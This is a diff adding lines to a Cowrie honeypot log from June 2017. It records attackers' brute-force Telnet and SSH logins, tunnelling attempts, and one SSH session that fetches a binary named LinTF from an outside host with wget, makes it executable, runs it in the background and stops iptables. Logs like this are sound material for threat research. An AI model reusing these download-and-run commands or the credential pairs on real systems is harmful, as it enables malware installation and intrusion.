@@ -5657,3 +5657,83 @@
 2017-06-09T13:10:58+0000 [CowrieTelnetTransport,32437,173.212.203.79] Warning: state changed and new state returned
 2017-06-09T13:11:00+0000 [CowrieTelnetTransport,32437,173.212.203.79] login attempt: 915
 2017-06-09T13:11:00+0000 [CowrieTelnetTransport,32437,173.212.203.79] login return, expect: [root/54321]
+2017-06-09T13:11:02+0000 [CowrieTelnetTransport,32437,173.212.203.79] login attempt [enable/shell] failed
+2017-06-09T13:11:02+0000 [CowrieTelnetTransport,32437,173.212.203.79] Warning: state changed and new state returned
+2017-06-09T13:11:03+0000 [CowrieTelnetTransport,32437,173.212.203.79] login attempt: 916
+2017-06-09T13:11:03+0000 [CowrieTelnetTransport,32437,173.212.203.79] login return, expect: [root/54321]
+2017-06-09T13:11:05+0000 [CowrieTelnetTransport,32437,173.212.203.79] login attempt [sh//bin/busybox ECCHI] failed
+2017-06-09T13:11:05+0000 [CowrieTelnetTransport,32437,173.212.203.79] Warning: state changed and new state returned
+2017-06-09T13:11:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] CMD: wget http://888689.f3322.net:8654/LinTF
+2017-06-09T13:11:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] Command found: wget http://888689.f3322.net:8654/LinTF
+2017-06-09T13:11:05+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://888689.f3322.net:8654/LinTF>
+2017-06-09T13:11:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: chmod 0755 /root/LinTF
+2017-06-09T13:11:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,14521,91.195.103.196] got channel 'direct-tcpip' request
+2017-06-09T13:11:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,14521,91.195.103.196] direct-tcp connection request to 23.5.96.14:443 from localhost:5556
+2017-06-09T13:11:05+0000 [CowrieTelnetTransport,32434,173.212.203.79] Connection lost after 50 seconds
+2017-06-09T13:11:05+0000 [SSHChannel None (24) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14521,91.195.103.196] direct-tcp forward to 23.5.96.14:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80W\xf0b\xe4\x10z\x18\xbaZ\t\xb2K\xf8\xa3\xdfkK\x94]ueB2\x9b\x1cj.\xc1\xaf\xf1\xc6.'
+2017-06-09T13:11:05+0000 [SSHChannel None (24) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14521,91.195.103.196] failed to connect: Connection refused
+2017-06-09T13:11:05+0000 [SSHChannel None (24) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14521,91.195.103.196] sending close 24
+2017-06-09T13:11:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: nohup /root/LinTF > /dev/null 2>&1 &
+2017-06-09T13:11:08+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:25658 (10.8.41.81:2222) [session: ee431da4]
+2017-06-09T13:11:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: chmod 777 LinTF
+2017-06-09T13:11:12+0000 [SSHChannel None (7) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14528,91.195.103.215] direct-tcp forward to 23.0.37.229:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80\xa3\x02\xe9\x1a\xcc+an\n\x96\xcbF*\xd8\x0c\xa0pb \x11\x90\xca\x8a\xbd\xc3,\xe7\x0e\xc7+b\x1e'
+2017-06-09T13:11:12+0000 [SSHChannel None (7) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14528,91.195.103.215] failed to connect: Connection refused
+2017-06-09T13:11:12+0000 [SSHChannel None (7) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14528,91.195.103.215] sending close 7
+2017-06-09T13:11:14+0000 [HoneyPotSSHTransport,14577,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-09T13:11:14+0000 [HoneyPotSSHTransport,14577,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-09T13:11:14+0000 [HoneyPotSSHTransport,14577,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T13:11:14+0000 [HoneyPotSSHTransport,14577,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T13:11:14+0000 [HoneyPotSSHTransport,14577,113.195.145.52] connection lost
+2017-06-09T13:11:14+0000 [HoneyPotSSHTransport,14577,113.195.145.52] Connection lost after 6 seconds
+2017-06-09T13:11:15+0000 [CowrieTelnetTransport,32435,173.212.203.79] Connection lost after 54 seconds
+2017-06-09T13:11:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: ./LinTF
+2017-06-09T13:11:18+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:45899 (10.8.41.81:2222) [session: cf5ad55e]
+2017-06-09T13:11:19+0000 [HoneyPotSSHTransport,14578,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-09T13:11:19+0000 [HoneyPotSSHTransport,14578,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-09T13:11:19+0000 [HoneyPotSSHTransport,14578,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T13:11:19+0000 [HoneyPotSSHTransport,14578,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-09T13:11:19+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: chmod 0755 /root/LinTF
+2017-06-09T13:11:20+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,14549,91.195.103.220] got channel 'direct-tcpip' request
+2017-06-09T13:11:20+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,14549,91.195.103.220] direct-tcp connection request to 23.0.37.229:443 from localhost:5556
+2017-06-09T13:11:20+0000 [SSHChannel None (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14549,91.195.103.220] direct-tcp forward to 23.0.37.229:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x807\x97\xaf\x11\n\xb1.\xc7\xb4{\x0e\xe5\xae\x08\xb2;\xe7\xf1+p\x16\xd7Y\xf7\x94\xf8z\xdc\xbc117'
+2017-06-09T13:11:20+0000 [SSHChannel None (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14549,91.195.103.220] failed to connect: Connection refused
+2017-06-09T13:11:20+0000 [SSHChannel None (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14549,91.195.103.220] sending close 2
+2017-06-09T13:11:20+0000 [HoneyPotSSHTransport,14578,113.195.145.52] NEW KEYS
+2017-06-09T13:11:20+0000 [HoneyPotSSHTransport,14578,113.195.145.52] starting service 'ssh-userauth'
+2017-06-09T13:11:23+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,14578,113.195.145.52] 'root' trying auth 'none'
+2017-06-09T13:11:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,14578,113.195.145.52] 'root' authenticated with 'none'
+2017-06-09T13:11:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,14578,113.195.145.52] starting service 'ssh-connection'
+2017-06-09T13:11:24+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: nohup /root/LinTF &gt; /dev/null 2&gt;&amp;1 &amp;
+2017-06-09T13:11:25+0000 [CowrieTelnetTransport,32433,122.4.144.161] Connection lost after 72 seconds
+2017-06-09T13:11:25+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 122.4.144.161:48014 (10.8.41.81:2223) [session: TT32438]
+2017-06-09T13:11:27+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: chmod 0777 LinTF
+2017-06-09T13:11:28+0000 [CowrieTelnetTransport,32438,122.4.144.161] login attempt: 125
+2017-06-09T13:11:28+0000 [CowrieTelnetTransport,32438,122.4.144.161] login return, expect: [guest/default]
+2017-06-09T13:11:30+0000 [CowrieTelnetTransport,32438,122.4.144.161] login attempt [admin/11111111] failed
+2017-06-09T13:11:30+0000 [CowrieTelnetTransport,32438,122.4.144.161] Warning: state changed and new state returned
+2017-06-09T13:11:30+0000 [HoneyPotSSHTransport,14578,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-09T13:11:30+0000 [HoneyPotSSHTransport,14578,113.195.145.52] avatar root logging out
+2017-06-09T13:11:30+0000 [HoneyPotSSHTransport,14578,113.195.145.52] connection lost
+2017-06-09T13:11:30+0000 [HoneyPotSSHTransport,14578,113.195.145.52] Connection lost after 11 seconds
+2017-06-09T13:11:31+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: chmod u+x LinTF
+2017-06-09T13:11:32+0000 [CowrieTelnetTransport,32438,122.4.144.161] login attempt: 126
+2017-06-09T13:11:32+0000 [CowrieTelnetTransport,32438,122.4.144.161] login return, expect: [guest/default]
+2017-06-09T13:11:34+0000 [CowrieTelnetTransport,32438,122.4.144.161] login attempt [enable\x00/system\x00] failed
+2017-06-09T13:11:34+0000 [CowrieTelnetTransport,32438,122.4.144.161] Warning: state changed and new state returned
+2017-06-09T13:11:34+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:42694 (10.8.41.81:2222) [session: 508f03c9]
+2017-06-09T13:11:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: ./LinTF &
+2017-06-09T13:11:36+0000 [CowrieTelnetTransport,32438,122.4.144.161] login attempt: 127
+2017-06-09T13:11:36+0000 [CowrieTelnetTransport,32438,122.4.144.161] login return, expect: [guest/default]
+2017-06-09T13:11:38+0000 [CowrieTelnetTransport,32438,122.4.144.161] login attempt [shell\x00/sh\x00] failed
+2017-06-09T13:11:38+0000 [CowrieTelnetTransport,32438,122.4.144.161] Warning: state changed and new state returned
+2017-06-09T13:11:38+0000 [CowrieTelnetTransport,32437,173.212.203.79] Connection lost after 48 seconds
+2017-06-09T13:11:39+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: chmod u+x LinTF
+2017-06-09T13:11:43+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: ./LinTF &
+2017-06-09T13:11:47+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: cd /tmp
+2017-06-09T13:11:50+0000 [HoneyPotSSHTransport,14579,113.195.145.52] connection lost
+2017-06-09T13:11:50+0000 [HoneyPotSSHTransport,14579,113.195.145.52] Connection lost after 16 seconds
+2017-06-09T13:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: service iptables stop
+2017-06-09T13:11:51+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:20587 (10.8.41.81:2222) [session: aeaa453f]
+2017-06-09T13:11:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: wget http://888689.f3322.net:8654/LinTF
+2017-06-09T13:11:59+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,14576,113.80.99.183] QUEUED INPUT: chmod 0755 /root/LinTF
